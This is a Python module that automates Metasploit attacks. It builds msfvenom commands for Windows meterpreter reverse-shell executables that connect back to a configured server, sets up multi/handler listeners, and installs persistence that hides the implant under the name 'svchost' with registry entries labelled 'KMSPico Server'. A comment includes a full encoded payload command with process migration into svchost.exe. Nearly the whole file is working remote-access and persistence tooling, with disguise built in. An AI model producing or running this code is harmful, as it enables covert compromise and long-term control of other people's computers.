from typing import Any, Callable, Optional, List, Type
from base.config import config

CommandExecutor = Callable[[str], Any]


class Payload:
    name: str  # windows/x64/meterpreter/reverse_tcp
    encoder: Optional[str] = None
    iterations: Optional[int] = None
    arch: Optional[str] = None
    format: str
    platform: str
    extra_args: List[str] = []
    lport_first_stage: int
    lport_persistence: int
    persistence_command: str
    filename_first_stage: str
    gather_info_command: str

    @classmethod
    @property
    def command_args(cls) -> List[str]:
        # msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=192.168.1.8 LPORT=51309 -e x86/shikata_ga_nai -i 2 -a x64 --platform win PrependMigrate=true PrependMigrateProc=svchost.exe RC4PASSWORD=bgsmonpwd123 -f exe -o t3.exe
        args = []
        args.extend(["-p", cls.name])
        args.extend(["LHOST=" + config.server.host])
        args.extend(["LPORT=" + str(cls.lport_first_stage)])
        if cls.encoder:
            args.extend(["-e", cls.encoder])
        if cls.iterations:
            args.extend(["-i", str(cls.iterations)])
        if cls.arch:
            args.extend(["-a", cls.arch])
        args.extend(["--platform", cls.platform])
        if cls.extra_args:
            args.extend(cls.extra_args)
        args.extend(["-f", cls.format])
        args.extend(["-o", cls.filename_first_stage])
        return args

    @classmethod
    @property
    def handler_commands(cls) -> List[str]:
        return [
            """
use exploit/multi/handler
set payload {name}
set lhost {lhost}
set lport {lport}
set ExitOnSession false
set SessionExpirationTimeout 0
exploit -j -z
""".format(
                lhost=config.server.host, lport=port, name=cls.name
            )
            for port in [cls.lport_first_stage, cls.lport_persistence]
        ]

    @classmethod
    def persist(cls, session_id: str, command_executor: CommandExecutor):
        raise NotImplementedError


payloads: List[Type[Payload]] = []
need_persist_ports: List[int] = []


def register_payload(cls: Type[Payload]):
    payloads.append(cls)
    need_persist_ports.append(cls.lport_first_stage)
    return cls


def get_payload_by_name(name: str) -> Type[Payload]:
    name = name.removeprefix("payload/")
    for payload in payloads:
        if payload.name == name:
            return payload
    raise ValueError("Payload not found")


@register_payload
class Windows64Payload(Payload):
    name = "windows/x64/meterpreter/reverse_tcp"
    encoder = None
    iterations = None
    arch = "x64"
    format = "exe"
    platform = "win"
    extra_args = []
    lport_first_stage = 51091
    lport_persistence = 51092
    filename_first_stage = "bgs_1.exe"
    persistence_command = """
    use exploit/windows/local/persistence
    set lhost {lhost}
    set EXE_NAME svchost
    set VBS_NAME KMSPico Server
    set REG_NAME KMSPico Server
    set delay 600
    set session {session}
    set STARTUP SYSTEM
    run"""

    @classmethod
    def persist(cls, session_id, command_executor):
        return command_executor(
            cls.persistence_command.format(lhost=config.server.host, session=session_id)
        )


@register_payload
class Windows86Payload(Payload):
    name = "windows/meterpreter/reverse_tcp"
    encoder = None
    iterations = None
    arch = "x86"
    format = "exe"
    platform = "win"
    extra_args = []
    lport_first_stage = 51093
    lport_persistence = 51094
    filename_first_stage = "bgs_32.exe"
    persistence_command = """
    use exploit/windows/local/persistence
    set lhost {lhost}
    set EXE_NAME svchost
    set VBS_NAME KMSPico Server
    set REG_NAME KMSPico Server
    set delay 600
    set session {session}
    set STARTUP SYSTEM
    run"""

    @classmethod
    def persist(cls, session_id, command_executor):
        return command_executor(
            cls.persistence_command.format(lhost=config.server.host, session=session_id)
        )
